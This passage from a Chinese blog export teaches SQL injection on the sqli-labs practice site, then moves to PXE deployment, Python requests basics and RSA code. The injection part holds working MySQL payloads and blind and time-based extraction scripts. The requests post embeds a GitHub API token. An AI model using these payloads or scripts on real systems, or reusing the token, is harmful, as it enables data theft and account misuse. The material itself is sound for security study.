1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘username’ limit 0,1)--+，改变 regexp() 参数即可继续爆出其他列名。 4、利用 ord() 和 mid() 函数得到user表中的内容 ord()函数 ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))&gt;98%23 mid(a,b,c) 从位置b开始，截取a字符串的c位ord() 函数与ascii函数相同。 ord() 和 ascii() 作用相同， mid() 和 substr() 作用相同，爆表内容：?id=1&#39; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68--+，当然，还有一个简化一点的?id=1&#39; and binary mid((select username from security.users order by id limit 0,1),1,3)=&#39;Dum&#39;—+ 这个更简单一点。这样就可以得到表中的所有内容了。binary 关键字可以在比较时区分大小写。 经过这四步就可以得到整个表的信息了。 bool盲注脚本$_GET具体可查看原文链接,讲解的非常详细，非常适合我这种新手。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import sysimport requestsdef getPayload(result_index, char_index, ascii): # 系统表中数据 info_database_name = &quot;information_schema&quot; info_table_name = &quot;schemata&quot; # schemata / tables / columns info_column_name = &quot;schema_name&quot; # schema_name / table_name / column_name # 注入表中数据 database_name = &quot;security&quot; table_name = &quot;users&quot; column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;] # 附加url start_str = &quot;1&#x27; and &quot; end_str = &quot;--+&quot; # 连接select where_str = &quot;&quot; #where_str = &quot; where table_schema=&#x27;&quot;+database_name+&quot;&#x27;&quot;+&quot; and table_name=&#x27;&quot;+table_name+&quot;&#x27;&quot; select_str = &quot;select &quot;+info_column_name+&quot; from &quot;+info_database_name+&quot;.&quot;+info_table_name+where_str+&quot; limit &quot;+str(result_index)+&quot;,1&quot; #select_str = &quot;select concat_ws(&#x27;-&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot; # 连接payload sqli_str = &quot;(ascii(mid((&quot;+select_str+&quot;),&quot;+str(char_index)+&quot;,1))&gt;&quot;+str(ascii)+&quot;)&quot; payload = start_str + sqli_str + end_str return payloaddef execute(result_index, char_index, ascii): # 连接url url = &quot;http://localhost:8088/sqlilabs/Less-8/?id=&quot; exec_url = url + getPayload(result_index, char_index, ascii) #print(exec_url) # 检查回显 echo = &quot;You are in&quot; content = requests.get(exec_url).text if echo in content: return True else: return Falsedef dichotomy(result_index, char_index, left, right): while left &lt; right: # 二分法 ascii = int((left+right)/2) if execute(str(result_index), str(char_index+1), str(ascii)): left = ascii else: right = ascii # 结束二分 if left == right-1: if execute(str(result_index), str(char_index+1), str(ascii)): ascii += 1 break else: break return chr(ascii)if __name__ == &quot;__main__&quot;: for num in range(32): # 查询结果的数量 count = 0 for len in range(32): # 单条查询结果的长度 count += 1 char = dichotomy(num, len, 30, 126) if ord(char) == 31: # 单条查询结果已被遍历 break sys.stdout.write(char) sys.stdout.flush() if count == 1: # 查询结果已被遍历 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush() 我同学写的一个 0verwatch 12345678910111213141516171819202122import requestsurl = &quot;http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23&quot;#注意一下这里使用=去作为判断条件#url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23&quot;database = &#x27;&#x27;for i in range(1,50): for j in range(65,127): payload = url.format(_ = i,__ = j) #print payload ans = requests.get(payload) #print ans.content if &#x27;You are in...........&#x27; in ans.content: # database = database + chr(j) # print database table_name += chr(j) print table_name break bool盲注脚本$_POST 原文链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import sys import requestsdef getPayload(result_index, char_index, ascii): # 系统表中数据 info_database_name = &quot;information_schema&quot; info_table_name = &quot;schemata&quot; # schemata / tables / columns info_column_name = &quot;schema_name&quot; # schema_name / table_name / column_name # 注入表中数据 database_name = &quot;security&quot; table_name = &quot;users&quot; column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;] # 连接select where_str = &quot;&quot; #where_str = &quot; where table_schema=&#x27;&quot;+database_name+&quot;&#x27;&quot;+&quot; and table_name=&#x27;&quot;+table_name+&quot;&#x27;&quot; select_str = &quot;select &quot;+info_column_name+&quot; from &quot;+info_database_name+&quot;.&quot;+info_table_name+where_str+&quot; limit &quot;+str(result_index)+&quot;,1&quot; #select_str = &quot;select concat_ws(&#x27;-&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot; # 连接payload sqli_str = &quot;(ascii(mid((&quot;+select_str+&quot;),&quot;+str(char_index)+&quot;,1))&gt;&quot;+str(ascii)+&quot;)&quot; payload = &#123;&quot;uname&quot;:&quot;1&quot;, &quot;passwd&quot;:&quot;1&#x27; or &quot;+sqli_str+&quot;-- &quot;&#125; return payloaddef execute(result_index, char_index, ascii): # 连接url url = &quot;http://localhost:8088/sqlilabs/Less-11/&quot; payload = getPayload(result_index, char_index, ascii) #print(payload) # 检查回显 echo = &quot;Your Login name&quot; content = requests.post(url, data=payload).text if echo in content: return True else: return Falsedef dichotomy(result_index, char_index, left, right): while left &lt; right: # 二分法 ascii = int((left+right)/2) if execute(str(result_index), str(char_index+1), str(ascii)): left = ascii else: right = ascii # 结束二分 if left == right-1: if execute(str(result_index), str(char_index+1), str(ascii)): ascii += 1 break else: break return chr(ascii)if __name__ == &quot;__main__&quot;: for num in range(32): # 查询结果的数量 count = 0 for len in range(32): # 单条查询结果的长度 count += 1 char = dichotomy(num, len, 30, 126) if ord(char) == 31: # 单条查询结果已被遍历 break sys.stdout.write(char) sys.stdout.flush() if count == 1: # 查询结果已被遍历 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush() 报错注入函数介绍 concat()计数报错 select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a; 需要注意三个点，一是需要concat()计数，二是floor，取得0 or1 ，进行数据的重复，三是group by进行分组，此处会报错好像是因为MySQL的一个bug，rand() 有时候需要多试几次。如果关键的表被禁用的话，可以使用下面的方法 select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) 如果rand被禁用了可以使用用户变量来报错 select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) exp() select exp(~(select * from (select user())a)) //double数值类型超出范围exp()函数为以e为底的对数函数，版本在5.5.5及其之上，本例利用了exp报错 ~0 select !(select * from (select user())x) - 0bigint类型超出范围，0 是对0按位取反。 xpath extractvalue(1,concat(0x7a,(select @@version),0x7e)) //MySQL对XML数据进行修改的xpath函数，xpath语法错误。 updatexml updatexml(1,concat(0x7e,(select @@version),0x7e),1) //与第4个相同原理 重复特性 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; //mysql重复特性，此处重复了version，所以报错。 这里借用现成的payload?id=1&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)%23把version()替换成其他，就可以得到其他的信息 报错盲注语句 chaosec.top 1、通过floor报错,注入语句如下: 1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下: 1and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下: 1and 1=(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下: 1and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下: 1select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下: 1and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下: 1and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下: 1and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下: 1and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下: 1and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下: 1and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下: 1and linestring (()select * from(select user() )a)b ); updatexml完整注入 1爆库.and updatexml(1,concat(0x7e,database(),0x7e),1)# 2爆表.and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# 3爆列.and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’user’),0x7e),1)# 4爆内容.and updatexml(1,concat(0x7e,(select username from users),0x7e),1)# 延时(Time)注入1、利用 sleep() 函数进行注入?id=1&#39; and if(ascii(substr(database(),1,1))=116,1,sleep(5))--+if(x,1,sleep(5)) x处语句正确，直接返回结果，错误，延时返回2、利用 benchmark() 进行延时注入?id=1&#39;union select (if(substring(current,1,1)=char(115),benchmark(50000000,encode(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 from (select database() as current) as tb1--+如果正确的话就会函数就会执行一段时间才返回 延时注入脚本$_GET原文链接 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import sysimport timeimport requestsdef getPayload(result_index, char_index, ascii): # 系统表中数据 info_database_name = &quot;information_schema&quot; info_table_name = &quot;schemata&quot; # schemata / tables / columns info_column_name = &quot;schema_name&quot; # schema_name / table_name / column_name # 注入表中数据 database_name = &quot;security&quot; table_name = &quot;users&quot; column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;] # 附加url start_str = &quot;1&#x27; and &quot; end_str = &quot;--+&quot; # 连接select where_str = &quot;&quot; #where_str = &quot; where table_schema=&#x27;&quot;+database_name+&quot;&#x27;&quot;+&quot; and table_name=&#x27;&quot;+table_name+&quot;&#x27;&quot; select_str = &quot;select &quot;+info_column_name+&quot; from &quot;+info_database_name+&quot;.&quot;+info_table_name+where_str+&quot; limit &quot;+str(result_index)+&quot;,1&quot; #select_str = &quot;select concat_ws(&#x27;-&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot; # 连接payload sqli_str = &quot;if(ascii(mid((&quot;+select_str+&quot;),&quot;+str(char_index)+&quot;,1))=&quot;+str(ascii)+&quot;,sleep(0.2),0)&quot; payload = start_str + sqli_str + end_str return payloaddef execute(result_index, char_index, ascii): # 连接url url = &quot;http://localhost:8088/sqlilabs/Less-9/?id=&quot; exec_url = url + getPayload(result_index, char_index, ascii) #print(exec_url) # 检查延时 before_time = time.time() requests.head(exec_url) # 节约时间 after_time = time.time() use_time = after_time - before_time if use_time &gt; 0.1: return True else: return Falsedef exhaustive(result_index, char_index): # ascii可显字符从32到126共95个 按可能性顺序 ascii_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;_&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;,&#x27; &#x27;,&#x27;!&#x27;,&#x27;&quot;&#x27;,&#x27;#&#x27;,&#x27;$&#x27;,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;\\&#x27;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;*&#x27;,&#x27;+&#x27;,&#x27;,&#x27;,&#x27;-&#x27;,&#x27;.&#x27;,&#x27;/&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;:&#x27;,&#x27;;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&gt;&#x27;,&#x27;?&#x27;,&#x27;@&#x27;,&#x27;[&#x27;,&#x27;\\\\&#x27;,&#x27;]&#x27;,&#x27;^&#x27;,&#x27;`&#x27;,&#x27;&#123;&#x27;,&#x27;|&#x27;,&#x27;&#125;&#x27;,&#x27;~&#x27;] for ascii_char in ascii_list: ascii = ord(ascii_char) if execute(str(result_index), str(char_index+1), str(ascii)): return ascii_char return chr(1) if __name__ == &quot;__main__&quot;: for num in range(32): # 查询结果的数量 count = 0 for len in range(32): # 单条查询结果的长度 count += 1 char = exhaustive(num, len) if ord(char) == 1: # 单条查询结果已被遍历 break sys.stdout.write(char) sys.stdout.flush() if count == 1: # 查询结果已被遍历 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush() 延时注入脚本$_POST 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import sysimport timeimport requestsdef getPayload(result_index, char_index, ascii): # 系统表中数据 info_database_name = &quot;information_schema&quot; info_table_name = &quot;schemata&quot; # schemata / tables / columns info_column_name = &quot;schema_name&quot; # schema_name / table_name / column_name # 注入表中数据 database_name = &quot;security&quot; table_name = &quot;users&quot; column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;] # 连接select where_str = &quot;&quot; #where_str = &quot; where table_schema=&#x27;&quot;+database_name+&quot;&#x27;&quot;+&quot; and table_name=&#x27;&quot;+table_name+&quot;&#x27;&quot; select_str = &quot;select &quot;+info_column_name+&quot; from &quot;+info_database_name+&quot;.&quot;+info_table_name+where_str+&quot; limit &quot;+str(result_index)+&quot;,1&quot; #select_str = &quot;select concat_ws(&#x27;-&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot; # 连接payload sqli_str = &quot;if(ascii(mid((&quot;+select_str+&quot;),&quot;+str(char_index)+&quot;,1))=&quot;+str(ascii)+&quot;,sleep(0.2),0)&quot; payload = &#123;&quot;uname&quot;:&quot;1&quot;, &quot;passwd&quot;:&quot;1&#x27; or &quot;+sqli_str+&quot;-- &quot;&#125; return payloaddef execute(result_index, char_index, ascii): # 连接url url = &quot;http://localhost:8088/sqlilabs/Less-15/&quot; payload = getPayload(result_index, char_index, ascii) #print(payload) # 检查延时 before_time = time.time() requests.post(url, data=payload) after_time = time.time() use_time = after_time - before_time if use_time &gt; 0.1: return True else: return Falsedef exhaustive(result_index, char_index): # ascii可显字符从32到126共95个 按可能性顺序 ascii_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;_&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;,&#x27; &#x27;,&#x27;!&#x27;,&#x27;&quot;&#x27;,&#x27;#&#x27;,&#x27;$&#x27;,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;\\&#x27;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;*&#x27;,&#x27;+&#x27;,&#x27;,&#x27;,&#x27;-&#x27;,&#x27;.&#x27;,&#x27;/&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;:&#x27;,&#x27;;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&gt;&#x27;,&#x27;?&#x27;,&#x27;@&#x27;,&#x27;[&#x27;,&#x27;\\\\&#x27;,&#x27;]&#x27;,&#x27;^&#x27;,&#x27;`&#x27;,&#x27;&#123;&#x27;,&#x27;|&#x27;,&#x27;&#125;&#x27;,&#x27;~&#x27;] for ascii_char in ascii_list: ascii = ord(ascii_char) if execute(str(result_index), str(char_index+1), str(ascii)): return ascii_char return chr(1) if __name__ == &quot;__main__&quot;: for num in range(32): # 查询结果的数量 count = 0 for len in range(32): # 单条查询结果的长度 count += 1 char = exhaustive(num, len) if ord(char) == 1: # 单条查询结果已被遍历 break sys.stdout.write(char) sys.stdout.flush() if count == 1: # 查询结果已被遍历 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush()","categories":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"PEX批量部署Linux服务器","slug":"编程/PEX批量部署Linux服务器","date":"2019-03-02T03:11:35.000Z","updated":"2019-03-02T06:09:58.177Z","comments":true,"path":"2019/03/02/编程/PEX批量部署Linux服务器/","link":"","permalink":"http://example.com/2019/03/02/%E7%BC%96%E7%A8%8B/PEX%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"前言这部分不一定能用的到","text":"前言这部分不一定能用的到 PEX如果在运维过程中，需要大规模的部署Linux服务器的话，我们就可以通过PEX来批量部署，这样的话部署的Linux的基础配置都是统一的，而且效率高。 过程安装DHCP服务器，用yum来安装。yum -y install dhcp 安装啊完成后，cd /usr/share/doc cd dhcp-4.2.5/cp dhcpd.conf.example /etc/dhcp/dhcpd.conf 覆盖掉原来的文件 然后 cd /etc/dhcp/vim dhcp.conf 编辑这个文件，把原来的删除,更改如下： 123456789101112default-lease-time 600;max-lease-time 7200;log-facility local7;subnet 10.11.11.0(本机ip) netmask 255.255.255.0本机网关( range=10.11.11.26 10.11.11.30;(一个范围) option routers 10.11.11.254; option broadcast-address 10.11.11.255; default-lease-time 600; max-lease-time 7200; next-server 10.11.11.1; //制定PEX引导服务器 filename &quot;pxelinux.0&quot;;) 然后，启动dhcp服务，start dhcpd.service 2安装tftp-Server与syslinuxtftp-Server远程启动服务syslinux引导模块 yum -y install sftp-serveryum -y install syslinux 安装完成后，启动tftp-server服务vim /etc/xinetd.d/tftp然后把文件中的disable=yes改成disable=no即可 重启tftp服务systemctl restart xinetd可以查看一下69端口netstat -aupn |grep 69 tftp工作于69端口 然后cd /var/lib/tftpbootcp /usr/share/syslinux/pxelinux.0 ./cp /var/ftp/yum/isolinux/vmlinux ./cp /var/ftp/yum/isolinux/initrd.img ./cp /var/ftp/yum/isolinux/vesamenu.c32 ./cp /var/ftp/yum/isolinux/boot.msg ./ 拷贝完成后，获取并编辑启动菜单配置文件mkdir pxelinux.cfgcp /var/ftp/yum/isolinux/ioslinux.cfg ./pxelinux.cfg/defaultvim pexlinux.cfg/default 找到”label linux”这一行。在这一行前面添加如下内容： 12345label centos menu label ^Install Centos 7 For PEX menu default kernal vmlinuz append initrd=initrd.img inst.stage2=ftp://10.11.11.1/yum inst.ks=ftp://10.11.11.1/ks.cfg quiet 3安装Kickstart返回根目录yum -y install system-config-kickstart 安装完成后启动system-config-kickstart 进行如下配置 添加分区 网络配置 防火墙配置 显示配置-&gt;启用 安装后脚本配置 配置完成 然后创建一台新的虚拟机，进行PXE远程安装测试。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"简单学习Python安全","slug":"编程/简单学习Python安全","date":"2019-03-01T13:54:27.000Z","updated":"2021-05-23T07:29:38.369Z","comments":true,"path":"2019/03/01/编程/简单学习Python安全/","link":"","permalink":"http://example.com/2019/03/01/%E7%BC%96%E7%A8%8B/%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0Python%E5%AE%89%E5%85%A8/","excerpt":"前言在安全牛上学的，都是些基础的，来整理一下。","text":"前言在安全牛上学的，都是些基础的，来整理一下。 requests库requests是python实现的简单易用的HTTP库，使用起来比urllib简洁很多，因为是第三方库，所以使用前需要cmd安装pip install requests 安装requests库 具体信息看注释。 $_GET方式提交请求12345678910111213141516171819202122232425262728293031323334import requestsurl=&quot;http://baidu.com&quot;proxies=&#123; #代理，配合bp使用 &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;, &quot;https&quot;:&quot;http://127.0.0.1:8080&quot;,&#125;#添加header头,可以伪造X-Forwarded-forheaders=&#123;&#x27;user-agent&#x27;:&#x27;my-hahaha/0.0.1&#x27;,&#x27;lala&#x27;:&#x27;hello world&#x27;&#125;#修改cookiecookies=dict(cookies_are=&#x27;working&#x27;)r=requests.get(url,verify=False,proxies=proxies,headers=headers,cookies=cookies)print(r.text) #都可以返回结果，但是text碰到中文，可能出现乱码print(r.content) #推荐contentf=open(&quot;C:/Users/17295/Desktop/py.txt&quot;,&quot;wb+&quot;)f.write(r.content)f.close() #保存成文件print(r.request.headers) #查看请求头print(r.headers) #查看返回包的响应头print(r.cookies) #查看cookieprint(r.encoding) #查看编码格式r.encoding=&quot;UTF-8&quot; #改变编码格式print(r.status_code) #响应码200为正常响应，301是跳转，403权限不足，500+服务器错误 $_POST提交请求12345678910111213141516171819import requestsurl=&quot;https://account.tophant.com/login.html?response_type=code&amp;client_id=b611bfe4ef417dbc&amp;state=2e509c092de6ba1bf39a6fff76dd9a76&quot;proxies=&#123; #代理 &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;, &quot;https&quot;:&quot;http://127.0.0.1:8080&quot;,&#125;headers=&#123;&#x27;user-agent&#x27;:&#x27;my-hahaha/0.0.1&#x27;,&#x27;lala&#x27;:&#x27;hello world&#x27;&#125;cookies=dict(cookies_are=&#x27;working&#x27;)payload=&#123;&#x27;name&#x27;:&#x27;loop&#x27;,&#x27;age&#x27;:12&#125;r=requests.post(url,verify=False,data=payload,proxies=proxies,headers=headers,cookies=cookies)print(r.content) session()123456789101112# coding:utf-8# Build By LandGrey import requestscoon=requests.session() #会创建一个对象，这个对象每次的请求都是同一个cookie值，不会新生成url=&quot;http://www.baidu.com&quot;r=coon.get(url)r.request.headersr=coon.get(url)r.request.headers json()123456789101112131415161718#coding:utf-8import json #json作用_dic=&#123;&quot;name&quot;:&quot;loop&quot;,&quot;age&quot;:&quot;12&quot;&#125;print(_dic)print(type(_dic))s=json.dumps(_dic,indent=2) #indent是缩进,json()的作用是序列化，字典变成字符串print(s)print(type(s))d=json.load(s) #序列变成字典print(d)print(type(d)) 实践一下搜索github API中的信息 12345678910111213141516171819202122#coding:utf-8import requests #搜索github API中的信息import jsonif __name__==&quot;__main__&quot;: key=&quot;baidu&quot; url=&quot;https://api.github.com/search/code?q=%s&quot; % key TOKEN=&#x27;a9275dcdf30cc646fcf7df7569375b260105a059&#x27; #https://blog.csdn.net/u014175572/article/details/55510825 拿到token的方法 headers=&#123;&quot;Authorization&quot;:&quot;token %s&quot; % TOKEN&#125; params=&#123;&quot;per_page&quot;:10,&quot;page&quot;:0&#125; r=requests.get(url,headers=headers,params=params) d=r.json() print(json.dumps(d,indent=4)) multipocessingprocess_1123456789101112131415161718#coding:utf-8import multiprocessing #进程import timedef worker(interval): n=5 while n&gt;0: print(&quot;The time is &#123;0&#125;&quot;.format(time.ctime())) time.sleep(interval) n-=1;if __name__==&quot;__main__&quot;: p=multiprocessing.Process(target=worker,args=(3,)) #固定格式，args是参数 p.start() print(&quot;p.pid&quot;,p.pid) #进程id print(&quot;p.name&quot;,p.name) print(&quot;p.is_alive&quot;,p.is_alive) process_212345678910111213141516171819202122232425262728293031323334#coding:utf-8import multiprocessing #多进程import timedef worker_1(interval): print(&quot;worker_1&quot;) time.sleep(interval) print(&quot;end worker_1&quot;)def worker_2(interval): print(&quot;worker_2&quot;) time.sleep(interval) print(&quot;end worker_2&quot;)def worker_3(interval): print(&quot;worker_3&quot;) time.sleep(interval) print(&quot;end worker_3&quot;)if __name__==&quot;__main__&quot;: p1=multiprocessing.Process(target=worker_1,args=(2,)) p2=multiprocessing.Process(target=worker_2,args=(3,)) p3=multiprocessing.Process(target=worker_3,args=(4,)) p1.start() p2.start() p3.start() print(&quot;The number of cpu is:&quot;+str(multiprocessing.cpu_count())) for p in multiprocessing.active_children(): print(&quot;chile p.name&quot;+p.name+&quot;\\tp.id:&quot;+str(p.pid)) print(&quot;END!!!!!!!!!!!!!&quot;)","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python实现RSA","slug":"编程/Python实现RSA","date":"2019-03-01T13:19:05.000Z","updated":"2021-05-23T07:32:54.280Z","comments":true,"path":"2019/03/01/编程/Python实现RSA/","link":"","permalink":"http://example.com/2019/03/01/%E7%BC%96%E7%A8%8B/Python%E5%AE%9E%E7%8E%B0RSA/","excerpt":"前言密码学作业之RSA","text":"前言密码学作业之RSA 简介RSA公开密钥密码体制。所谓的公开密钥密码体制就是使用不同的加密密钥与解密密钥，是一种“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制。 原理RSA 算法的可靠性基础：对极大整数做因数分解是很困难的。RSA 是非对称算法，加解密使用不同的密钥。两个密钥都可以用于加密，解密时需要使用另一个密钥。但是，通常用公钥加密私钥解密，因为公钥是近乎完全公开的，对于私钥加密的数据，有太多的人可以解密了。理论上 A 和 B 之间要通过 RSA 实现保密通信，需要 A 和 B 各自生成一组密钥，同时保管好自己的私钥；用对方的公钥加密要发送的消息，用自己的私钥解密对方发送过来的消息。 加密公式： c=me mod n解密公式： m=cd mod n 加密过程：（1） 获得接收方公钥（e,n）（2） 把消息m分组为长度为L的消息分组（3） 使用上面加密算法计算出密文（4） 将密文c发送给接收方 解密过程:（1） 接收方收到明文c（2） 使用私钥d和上面的解密算法逐一恢复明文分组 （3） 得到明文消息m 生成公钥和私钥: （1）随意选择两个大的质数 p 和 q，p 不等于 q，计算 N=pq。（2）根据欧拉函数，求得 r=φ(N)=φ(p)φ(q)=(p−1)(q−1)（3）选择一个小于 r 的整数 e，使 e 与 r 互质。并求得 e 关于 r 的模反元素，命名为 d（求 d 令 ed≡1(modr)）。（模反元素存在，当且仅当 e 与 r 互质） 将 p 和 q 的记录销毁(N,e) 是公钥， (N,d)(N,d) 是私钥。公钥发送给所有的通信对象（对服务器来说就是所有的客户端），私钥则必须保管好，防止泄露。 核心代码扩展欧几里得算法求模反元素 12345678910def ex_euclid(a, b, list): if b == 0: list[0] = 1L list[1] = 0L list[2] = a else: ex_euclid(b, a % b, list) temp = list[0] list[0] = list[1] list[1] = temp - a / b * list[1] 求模反元素 12345678def mod_inverse(a, b): list = [0L, 0L, 0L] if a &lt; b: a, b = b, a ex_euclid(a, b, list) if list[1] &lt; 0: list[1] = a + list[1] return list[1] 快速幂模运算，把b拆分为二进制，遍历b的二进制，当二进制位为0时不计入计算 123456789101112131415161718192021222324252627282930313233def quick_pow_mod(a, b, c): a = a % c ans = 1 while b != 0: if b &amp; 1: ans = (ans * a) % c b &gt;&gt;= 1 a = (a % c) * (a % c) return ansdef miller_rabin_witness(a, n): if n == 1: # n为要检验的大数，a &lt; n,k = n - 1 return False if n == 2: return True k = n - 1 q = int(math.floor(math.log(k, 2))) while q &gt; 0: m = k / 2 ** q if k % 2 ** q == 0 and m % 2 == 1: break q = q - 1 if quick_pow_mod(a, n - 1, n) != 1: return False b1 = quick_pow_mod(a, m, n) for i in range(1, q + 1): if b1 == n - 1 or b1 == 1: return True b2 = b1 ** 2 % n b1 = b2 if b1 == 1: return True return False Miller-Rabin素性检验算法,检验8次 1234567def prime_test_miller_rabin(p, k): while k &gt; 0: a = random.randint(1, p - 1) if not miller_rabin_witness(a, p): return False k = k - 1 return True 判断 num 是否与 prime_arr 中的每一个数都互质 123456def 